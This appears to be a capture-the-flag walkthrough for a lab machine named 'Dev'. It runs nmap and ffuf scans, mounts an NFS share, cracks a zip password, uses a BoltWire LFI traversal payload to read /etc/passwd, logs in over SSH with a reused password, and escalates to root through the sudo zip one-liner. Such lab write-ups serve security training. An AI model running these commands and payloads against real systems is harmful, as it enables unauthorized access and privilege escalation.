# Dev Walkthrough

## Enumeration
```bash
nmap -A -T4 -p- $IP -oA $IP-dev-scan
```

Of interest to us are ports: 80, 2049, and 8080:
![[nmap scan of Dev.png]]
On port 80, it seems to be running Bolt CMS, but this shows us an error page and on port 8080, we see that it's a PHP running PHP Version 7.3.27-1

Let's fuzz against port 80 and 8080. Make sure to replace the IP address with your target IP:
For port 80 do:
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.122.179/FUZZ
```

For port 8080 do:
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.122.179:8080/FUZZ
```

From the result, we see that for both ports, there is a `server-status` page.

Port 80 fuzz results:
![[ffuf fuzz on port 80.png]]

Port 8080 fuzz results:
![[ffuf fuzz on port 8080.png]]

We can try to mount the nfs directory:
```bash
showmount -e 192.168.122.179
```
![[showmount of nfs.png]]

First, make a directory, with sudo privileges, in `/mnt` called `/mnt/dev`
```bash
sudo mkdir /mnt/dev
```

Then mount the directory to `/mnt/dev`:
```bash
sudo mount -t nfs 192.168.122.179:/srv/nfs /mnt/dev
```

After changing into the directory and list out it's contents, we see that there is a password-protected zip file called `save.zip`.
Make sure to install `fcrackzip` by doing:
```bash
sudo apt install fcrackzip
``` 
to crack the zip so that we can get the password and unzip it.

```bash
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
```
![[fcrackzip on save.zip.png]]
Using `java101` as the password, we use `unzip save.zip` and find 2 files: `id_rsa` and `todo.txt`

If we browse to the directories listed after we had fuzzed the ports, we find something at `http://192.168.122.179/app/`
![[app directory.png]]

Might come in handy from file `config.yml`:
![[sqlite database credentials.png]]
```bash
username: bolt
password: I_love_java
```

Let's create a new user. We will use the credentials `hacker:hacker` in our example. We don't find anything that we can do with this so search on Google for **boltwire exploit**. You can also do `searchsploit boltwire`.
![[searchsploit boltwire.png]]

Let's use the exploit for LFI. The link to the exploit: https://www.exploit-db.com/exploits/48411
![[exploit-db for boltwire LFI.png]]
Make sure you have a registered user and paste it into this into the URL: `index.php?p=action.search&action=../../../../../../../etc/passwd
`
Notice that we have LFI:
![[LFI successful.png]]

`johnpaul` is a user that has `/bin/bash` access:
![[jeanpaul has bash access.png]]

Let's use `johnpaul` to `ssh` into the server. We will try to use the password that we got from the `config.yml` file.
![[ssh as jeanpaul.png]]

It works!

Try to see what `jeanpaul` can execute:
![[jeanpaul privileges.png]]

We can escalate privileges by going out to https://gtfobins.github.io/gtfobins/zip/ and copy/pasting and executing the first two lines: 
![[gtfobins for zip.png]]

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

We have root!
![[We have root and the flag.png]]

Done.